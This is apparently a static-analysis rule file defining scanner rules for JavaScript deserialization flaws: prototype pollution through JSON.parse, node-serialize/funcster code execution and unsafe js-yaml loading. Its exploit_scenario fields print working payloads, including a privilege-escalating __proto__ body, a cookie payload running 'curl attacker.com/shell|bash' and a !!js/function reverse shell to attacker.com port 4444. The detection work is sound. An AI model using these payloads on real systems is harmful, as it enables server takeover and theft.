rules:
  # ============================================================================
  # DESER-JS-001: JSON.parse Prototype Pollution
  # ============================================================================
  - rule_id: "DESER-JS-001"
    title: "JSON.parse with User Input in Prototype-Pollution-Prone Context"
    description: >
      Detects usage of JSON.parse on user-controlled input where the resulting
      object is merged, assigned, or spread into another object without proper
      sanitization of __proto__, constructor, or prototype properties. This
      pattern is the primary vector for prototype pollution attacks in Node.js
      and browser JavaScript applications. An attacker can inject properties
      such as __proto__.isAdmin to escalate privileges, override security
      checks, or achieve remote code execution through polluted object chains.
    language: javascript
    category: deserialization
    severity: High
    confidence: 0.90
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - prototype-pollution
      - json-parse
      - user-input
      - javascript
      - node
      - server-side
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*(req\.(body|query|params|headers))'
        description: "JSON.parse called directly on Express request properties"
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*(ctx\.(request\.body|query|params))'
        description: "JSON.parse called directly on Koa context request properties"
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*Buffer\.from\s*\('
        description: "JSON.parse on Buffer.from conversion of potentially untrusted data"
      - type: regex
        pattern: 'Object\.assign\s*\([^)]*,\s*JSON\.parse\s*\('
        description: "Object.assign merging parsed JSON into target object"
      - type: regex
        pattern: '(\.\.\.\s*JSON\.parse\s*\()'
        description: "Spread operator on JSON.parse result into object literal"
      - type: regex
        pattern: '(merge|deepMerge|extend|defaults|defaultsDeep)\s*\([^)]*JSON\.parse'
        description: "Deep merge utility applied to JSON.parse output"
      - type: regex
        pattern: '_\.merge\s*\([^)]*JSON\.parse\s*\('
        description: "Lodash merge with JSON.parse result enabling prototype pollution"
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*(event\.body|request\.body|payload|data|input|message)'
        description: "JSON.parse on generic user-controlled variable names"
    anti_patterns:
      - 'JSON\.parse\s*\(\s*JSON\.stringify'
      - 'JSON\.parse\s*\(\s*["\x27]\{'
      - 'JSON\.parse\s*\(\s*fs\.readFileSync'
      - 'JSON\.parse\s*\(\s*process\.env\.'
      - 'JSON\.parse\s*\(\s*["\x27]\['
      - 'sanitize.*JSON\.parse'
      - 'JSON\.parse.*hasOwnProperty\s*\(\s*["\x27]__proto__'
      - 'JSON\.parse\s*\(\s*config\.'
      - 'JSON\.parse\s*\(\s*readFileSync'
      - 'JSON\.parse\s*\(\s*packageJson'
      - 'JSON\.parse\s*\(\s*manifest'
      - 'JSON\.parse\s*\(\s*["\x27]null["\x27]'
      - 'JSON\.parse\s*\(\s*["\x27]true["\x27]'
      - 'const\s+\w+\s*=\s*JSON\.parse\s*\(\s*["\x27]'
      - 'try\s*\{[^}]*JSON\.parse[^}]*\}\s*catch.*return\s+(null|undefined|false)'
    bypass_variants:
      - description: "Indirect JSON.parse via variable aliasing"
        pattern: '(const|let|var)\s+\w+\s*=\s*JSON\[.parse.\]'
      - description: "JSON.parse through dynamic property access"
        pattern: 'JSON\[\s*["\x27]parse["\x27]\s*\]\s*\('
      - description: "Prototype pollution via computed property name injection"
        pattern: '\[\s*["\x27]__proto__["\x27]\s*\]|\[\s*["\x27]constructor["\x27]\s*\]\s*\[\s*["\x27]prototype["\x27]\s*\]'
    evasion_indicators:
      - "Variable aliasing of JSON.parse"
      - "Dynamic property access on JSON object"
      - "Encoded __proto__ string in user input"
      - "Use of Reflect.apply to invoke parse"
      - "Obfuscated constructor.prototype chain access"
    encoding_variants:
      - type: "unicode_escape"
        pattern: '\\u005f\\u005fproto\\u005f\\u005f'
      - type: "hex_escape"
        pattern: '\\x5f\\x5fproto\\x5f\\x5f'
      - type: "base64"
        pattern: 'atob\s*\(\s*["\x27]X19wcm90b19f["\x27]\s*\)'
    multi_function_chain_patterns:
      - "JSON.parse -> Object.assign -> object usage in auth check"
      - "JSON.parse -> lodash.merge -> configuration object"
      - "JSON.parse -> spread into defaults -> template rendering"
      - "req.body -> JSON.parse -> deepMerge -> session state"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Prototype pollution can override isAdmin or role properties on Object.prototype, granting universal privilege escalation"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body / req.query / req.params"
        sink: "Object.assign / lodash.merge / spread operator"
        through: "JSON.parse"
      - source: "WebSocket message"
        sink: "Object property assignment"
        through: "JSON.parse -> merge utility"
      - source: "HTTP POST body"
        sink: "Configuration object mutation"
        through: "JSON.parse -> deepMerge"
    impact: |
      Prototype pollution via JSON.parse can lead to:
      - Remote Code Execution through polluted child_process options
      - Authentication bypass by injecting isAdmin or role properties
      - Denial of Service by overriding toString/valueOf on Object.prototype
      - Cross-Site Scripting via polluted template engine options
      - Information disclosure through polluted logging configurations
    remediation: |
      1. Use Object.create(null) for dictionary-like objects:
         ```javascript
         const safe = Object.create(null);
         Object.assign(safe, JSON.parse(userInput));
         ```
      2. Freeze Object.prototype in application bootstrap:
         ```javascript
         Object.freeze(Object.prototype);
         ```
      3. Validate and strip dangerous keys before merge:
         ```javascript
         function safeParse(input) {
           const obj = JSON.parse(input);
           delete obj.__proto__;
           delete obj.constructor;
           delete obj.prototype;
           return obj;
         }
         ```
      4. Use a safe merge library such as lodash >= 4.17.21 with whitelisted keys.
      5. Implement JSON schema validation before processing parsed objects.
    references:
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://portswigger.net/web-security/prototype-pollution"
      - "https://github.com/nicolo-ribaudo/tc39-proposal-realms"
    context_awareness:
      surrounding_context_patterns:
        - "Object.assign call within 5 lines of JSON.parse"
        - "Spread operator on parsed result"
        - "lodash merge/extend/defaults within call chain"
        - "No __proto__ key filtering before merge"
      taint_source_indicators:
        - "req.body"
        - "req.query"
        - "req.params"
        - "event.body"
        - "ctx.request.body"
        - "message.data"
      taint_sink_indicators:
        - "Object.assign"
        - "_.merge"
        - "_.defaultsDeep"
        - "spread operator in object literal"
        - "for...in loop property copy"
      sanitization_patterns:
        - "Object.keys().filter(k => !k.startsWith('__'))"
        - "JSON.parse(JSON.stringify(obj))"
        - "hasOwnProperty check before property access"
        - "Object.create(null) as target"
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_score)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        An attacker sends a POST request to an Express API endpoint with the
        following JSON body:
        {"__proto__": {"isAdmin": true, "role": "superuser"}}
        The server parses this with JSON.parse and merges it into a user
        configuration object using Object.assign. Because __proto__ is not
        filtered, Object.prototype is polluted. All subsequent object
        instances in the application now have isAdmin=true, bypassing
        authorization checks in middleware.
      example_payload: '{"__proto__": {"isAdmin": true, "role": "superuser"}}'
      attacker_objective: "Achieve privilege escalation by polluting Object.prototype with authorization-relevant properties"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "DESER-JS-002"
        - "DESER-JS-007"
        - "DESER-JS-008"

  # ============================================================================
  # DESER-JS-002: node-serialize / funcster RCE
  # ============================================================================
  - rule_id: "DESER-JS-002"
    title: "node-serialize or funcster Remote Code Execution via Deserialization"
    description: >
      Detects usage of the node-serialize or funcster libraries which support
      serialization and deserialization of JavaScript functions. The
      node-serialize library's unserialize function can execute arbitrary
      JavaScript code when processing specially crafted input containing
      Immediately Invoked Function Expressions (IIFE). The funcster library
      similarly reconstructs functions from serialized strings. Both are
      well-known vectors for remote code execution in Node.js applications.
    language: javascript
    category: deserialization
    severity: Critical
    confidence: 0.95
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - rce
      - node-serialize
      - funcster
      - iife
      - critical
      - node
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'require\s*\(\s*["\x27]node-serialize["\x27]\s*\)'
        description: "Import of the vulnerable node-serialize package"
      - type: regex
        pattern: '\.unserialize\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|message)'
        description: "unserialize called on user-controlled input"
      - type: regex
        pattern: 'require\s*\(\s*["\x27]funcster["\x27]\s*\)'
        description: "Import of the vulnerable funcster package"
      - type: regex
        pattern: 'funcster\.deepDeserialize\s*\('
        description: "funcster deepDeserialize call"
      - type: regex
        pattern: 'serialize\.unserialize\s*\('
        description: "Direct call to serialize.unserialize"
      - type: regex
        pattern: '_\$\$ND_FUNC\$\$_'
        description: "node-serialize function marker in data indicating serialized function payload"
      - type: regex
        pattern: 'from\s+["\x27]node-serialize["\x27]'
        description: "ES module import of node-serialize"
      - type: regex
        pattern: 'unserialize\s*\(\s*Buffer\.from\s*\('
        description: "unserialize on buffer-converted input"
    anti_patterns:
      - 'unserialize\s*\(\s*["\x27]\{'
      - 'unserialize\s*\(\s*JSON\.stringify'
      - '\/\/\s*test'
      - 'unserialize\s*\(\s*config\.'
      - '\.unserialize\s*\(\s*fs\.'
      - 'mock.*unserialize'
      - 'jest\.mock.*node-serialize'
      - 'unserialize\s*\(\s*serialize\s*\('
      - 'unserialize\s*\(\s*cache\.'
      - 'unserialize\s*\(\s*internal'
      - '\/\/\s*deprecated'
      - 'unserialize\s*\(\s*trusted'
      - 'unserialize\s*\(\s*signed'
      - '\/\*\s*safe\s*\*\/'
      - 'unserialize\s*\(\s*verified'
    bypass_variants:
      - description: "IIFE payload inside serialized function string"
        pattern: '_\$\$ND_FUNC\$\$_function\s*\(\s*\)\s*\{.*\}\s*\(\s*\)'
      - description: "Dynamic require of node-serialize to evade static analysis"
        pattern: 'require\s*\(\s*["\x27]node-["\x27]\s*\+\s*["\x27]serialize["\x27]\s*\)'
      - description: "Aliased import to hide library usage"
        pattern: '(const|let|var)\s+\w+\s*=\s*require\s*\(\s*["\x27]node-serialize["\x27]\s*\)\s*;\s*\w+\.unserialize'
    evasion_indicators:
      - "Dynamic require with string concatenation for module name"
      - "Base64-encoded serialized payload"
      - "IIFE wrapped in serialized function marker"
      - "Aliased module import name"
      - "Hex-encoded function body"
    encoding_variants:
      - type: "base64"
        pattern: 'Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)\.toString\s*\(\s*\).*unserialize'
      - type: "hex"
        pattern: 'Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)\.toString\s*\(\s*\).*unserialize'
      - type: "url_encoding"
        pattern: 'decodeURIComponent\s*\([^)]+\).*unserialize'
    multi_function_chain_patterns:
      - "req.body -> base64 decode -> unserialize -> code execution"
      - "cookie value -> parse -> unserialize -> RCE"
      - "WebSocket data -> Buffer.from -> unserialize -> child_process"
      - "HTTP header -> decode -> unserialize -> eval chain"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Direct remote code execution on the server with the privileges of the Node.js process"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body / req.cookies"
        sink: "serialize.unserialize"
        through: "Direct parameter passing or base64 decoding"
      - source: "WebSocket message"
        sink: "serialize.unserialize"
        through: "JSON.parse -> property extraction -> unserialize"
      - source: "Redis / message queue payload"
        sink: "funcster.deepDeserialize"
        through: "Queue consumer callback"
    impact: |
      Exploitation of node-serialize or funcster deserialization leads to:
      - Full Remote Code Execution on the server
      - Arbitrary file read/write via fs module access
      - Reverse shell establishment
      - Lateral movement within the infrastructure
      - Complete system compromise
      - Data exfiltration of all accessible databases and files
    remediation: |
      1. Remove node-serialize and funcster from dependencies entirely:
         ```bash
         npm uninstall node-serialize funcster
         ```
      2. Replace with safe serialization libraries:
         ```javascript
         // Use JSON for data serialization
         const data = JSON.parse(input);
         // Or use a schema-validated approach
         const Ajv = require('ajv');
         const ajv = new Ajv();
         const validate = ajv.compile(schema);
         ```
      3. Never deserialize functions from untrusted input.
      4. Implement Content Security Policy and input validation.
      5. Use process sandboxing (vm2 or isolated-vm) if dynamic code execution is required.
    references:
      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941"
      - "https://blog.websecurify.com/2017/02/hacking-node-serialize"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://cwe.mitre.org/data/definitions/502.html"
    context_awareness:
      surrounding_context_patterns:
        - "require('node-serialize') in same file"
        - "Cookie parsing before unserialize call"
        - "Base64 decode before unserialize"
        - "No input validation before unserialize"
      taint_source_indicators:
        - "req.cookies"
        - "req.body"
        - "req.headers"
        - "WebSocket message"
        - "event.body"
        - "process.stdin"
      taint_sink_indicators:
        - "serialize.unserialize"
        - "funcster.deepDeserialize"
        - "funcster.unserialize"
        - "eval"
        - "Function constructor"
      sanitization_patterns:
        - "Input schema validation before deserialization"
        - "Type checking before unserialize"
        - "Whitelist-based property filtering"
        - "HMAC signature verification of serialized data"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * exploitability_factor"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        An Express application uses node-serialize to deserialize session data
        stored in a cookie. An attacker crafts a cookie containing a
        node-serialize payload with an IIFE that spawns a reverse shell:
        {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl
        attacker.com/shell|bash')}()"}
        When the server calls serialize.unserialize(req.cookies.session), the
        function is reconstructed and immediately invoked, executing the
        reverse shell command on the server.
      example_payload: '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\")}()"}'
      attacker_objective: "Achieve remote code execution on the Node.js server to establish persistent access"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules:
        - "DESER-JS-001"
        - "DESER-JS-003"
        - "DESER-JS-007"

  # ============================================================================
  # DESER-JS-003: js-yaml Unsafe Load
  # ============================================================================
  - rule_id: "DESER-JS-003"
    title: "js-yaml Unsafe Load Enabling Arbitrary Code Execution"
    description: >
      Detects usage of js-yaml's unsafe load functions (yaml.load without
      specifying a safe schema, yaml.loadAll, or the deprecated
      yaml.safeLoad being bypassed). Prior to js-yaml v4, yaml.load()
      defaulted to DEFAULT_FULL_SCHEMA which supports JavaScript-specific
      types including !!js/function, !!js/regexp, and !!js/undefined.
      An attacker can exploit this to execute arbitrary JavaScript code
      via crafted YAML payloads containing !!js/function tags.
    language: javascript
    category: deserialization
    severity: Critical
    confidence: 0.92
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - yaml
      - js-yaml
      - rce
      - unsafe-load
      - code-execution
      - node
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'yaml\.load\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|content|text|raw)'
        description: "yaml.load called with user-controlled input"
      - type: regex
        pattern: 'yaml\.load\s*\([^)]*\)\s*(?!.*schema\s*:\s*(SAFE_SCHEMA|JSON_SCHEMA|FAILSAFE_SCHEMA))'
        description: "yaml.load without explicit safe schema specification"
      - type: regex
        pattern: 'yaml\.loadAll\s*\('
        description: "yaml.loadAll processes multiple documents and may be unsafe"
      - type: regex
        pattern: 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.DEFAULT_FULL_SCHEMA'
        description: "Explicit use of DEFAULT_FULL_SCHEMA enabling JS type execution"
      - type: regex
        pattern: 'require\s*\(\s*["\x27]js-yaml["\x27]\s*\).*\.load\s*\('
        description: "js-yaml require followed by load call in same context"
      - type: regex
        pattern: 'yaml\.Type\s*\(\s*["\x27]!!js/function["\x27]'
        description: "Custom YAML type definition for JavaScript functions"
      - type: regex
        pattern: 'yaml\.load\s*\(\s*fs\.readFileSync\s*\([^)]*req\.'
        description: "yaml.load on file path controlled by user input"
      - type: regex
        pattern: 'yaml\.load\s*\(\s*await\s+(fetch|axios|got|request)\s*\('
        description: "yaml.load on data fetched from external sources"
    anti_patterns:
      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.SAFE_SCHEMA'
      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.JSON_SCHEMA'
      - 'yaml\.load\s*\([^)]*,\s*\{\s*schema\s*:\s*yaml\.FAILSAFE_SCHEMA'
      - 'yaml\.safeLoad\s*\('
      - 'yaml\.load\s*\(\s*["\x27]'
      - 'yaml\.load\s*\(\s*`[^$]'
      - 'yaml\.load\s*\(\s*fs\.readFileSync\s*\(\s*path\.join\s*\(\s*__dirname'
      - 'yaml\.load\s*\(\s*fs\.readFileSync\s*\(\s*["\x27]\./'
      - '\/\/\s*eslint-disable.*security'
      - 'yaml\.load\s*\(\s*config'
      - 'yaml\.load\s*\(\s*template'
      - 'yaml\.load\s*\(\s*default'
      - 'yaml\.load\s*\(\s*fixture'
      - 'yaml\.load\s*\(\s*mock'
      - 'yaml\.load\s*\(\s*sample'
    bypass_variants:
      - description: "Using DEFAULT_FULL_SCHEMA to explicitly enable JS types"
        pattern: 'schema\s*:\s*yaml\.(DEFAULT_FULL_SCHEMA|FULL_SCHEMA)'
      - description: "Constructing a custom schema that includes JS types"
        pattern: 'yaml\.Schema\.create\s*\([^)]*yaml\.DEFAULT_FULL_SCHEMA'
      - description: "Using loadAll to process multiple potentially malicious documents"
        pattern: 'yaml\.loadAll\s*\(\s*(req\.|ctx\.|data|input|body)'
    evasion_indicators:
      - "Using js-yaml version < 4.0 where load is unsafe by default"
      - "Dynamic schema assignment from configuration"
      - "Custom type constructors that permit function instantiation"
      - "Encoded YAML payloads decoded before loading"
    encoding_variants:
      - type: "base64_yaml"
        pattern: 'yaml\.load\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
      - type: "url_encoded"
        pattern: 'yaml\.load\s*\(\s*decodeURIComponent\s*\('
      - type: "multipart"
        pattern: 'yaml\.load\s*\(\s*file\.(buffer|content|data)'
    multi_function_chain_patterns:
      - "file upload -> read file content -> yaml.load -> config merge"
      - "API endpoint -> req.body -> yaml.load -> database insert"
      - "webhook -> payload -> yaml.load -> event processing"
      - "CI config -> yaml.load -> build command execution"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "YAML deserialization with !!js/function tag executes arbitrary code in the Node.js process context"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body / file upload content"
        sink: "yaml.load"
        through: "Direct parameter passing"
      - source: "External URL fetch response"
        sink: "yaml.load"
        through: "HTTP client response body"
      - source: "Message queue payload"
        sink: "yaml.loadAll"
        through: "Consumer callback data parameter"
    impact: |
      Unsafe YAML deserialization in js-yaml can result in:
      - Remote Code Execution via !!js/function tags
      - Server-Side Request Forgery via crafted YAML types
      - Denial of Service through resource-intensive YAML constructs (billion laughs)
      - Information disclosure through !!js/regexp and error-based side channels
      - Full server compromise with access to all Node.js APIs
    remediation: |
      1. Upgrade to js-yaml v4+ where load() uses SAFE_SCHEMA by default:
         ```bash
         npm install js-yaml@latest
         ```
      2. Always specify a safe schema explicitly:
         ```javascript
         const yaml = require('js-yaml');
         const data = yaml.load(input, { schema: yaml.JSON_SCHEMA });
         ```
      3. Use yaml.safeLoad (pre-v4) or validate YAML structure after loading:
         ```javascript
         const data = yaml.load(input, { schema: yaml.FAILSAFE_SCHEMA });
         ```
      4. Implement input size limits to prevent billion-laughs DoS.
      5. Validate loaded data against a JSON Schema before processing.
    references:
      - "https://github.com/nodeca/js-yaml/issues/480"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://snyk.io/vuln/npm:js-yaml"
    context_awareness:
      surrounding_context_patterns:
        - "js-yaml import in same file"
        - "No schema parameter in load options"
        - "User-controlled input flows into yaml.load"
        - "File upload handling before yaml.load"
      taint_source_indicators:
        - "req.body"
        - "req.file.buffer"
        - "uploaded file content"
        - "external fetch response"
        - "webhook payload"
        - "form data field"
      taint_sink_indicators:
        - "yaml.load"
        - "yaml.loadAll"
        - "YAML.parse"
        - "yaml.safeLoad with overridden schema"
      sanitization_patterns:
        - "schema: yaml.SAFE_SCHEMA"
        - "schema: yaml.JSON_SCHEMA"
        - "schema: yaml.FAILSAFE_SCHEMA"
        - "yaml.safeLoad usage"
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - safe_schema_present)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A configuration management API accepts YAML input from authenticated
        users to define deployment settings. The endpoint uses yaml.load()
        without specifying a safe schema. An attacker submits YAML containing:
        !!js/function "function(){var net=require('net'),cp=require('child_process'),
        sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,
        'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);})}()"
        This establishes a reverse shell from the server to the attacker.
      example_payload: "!!js/function >-\n  function(){require('child_process').execSync('id');}()"
      attacker_objective: "Execute arbitrary code on the server via YAML deserialization to establish persistent backdoor access"
    confidence_factors:
